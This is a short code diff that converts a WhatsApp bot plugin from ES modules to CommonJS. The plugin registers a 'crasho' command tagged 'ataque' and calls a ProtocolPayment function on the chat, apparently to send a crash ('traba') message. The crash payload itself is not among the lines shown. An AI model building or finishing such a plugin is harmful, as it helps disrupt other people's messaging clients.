@@ -1,8 +1,9 @@
-import { generateWAMessageFromContent, proto } from '@whiskeysockets/baileys';
+const baileys = require('@whiskeysockets/baileys');
+const generateWAMessageFromContent = baileys.generateWAMessageFromContent;
+const proto = baileys.proto;
 
 let handler = async (m, { conn }) => {
 
-    // Definir destino y conexión globales para la función
     global.jid = m.chat;
     global.zen = conn;
 
@@ -35,11 +36,10 @@ let handler = async (m, { conn }) => {
         await zen.relayMessage(jid, etc.message, { messageId: etc.key.id });
     }
 
-    // Ejecutar traba
     await ProtocolPayment(m.chat);
 };
 
 handler.command = ['crasho'];
 handler.tags = ['fake', 'ataque'];
 handler.help = ['crasho'];
-export default handler;
+module.exports = handler;
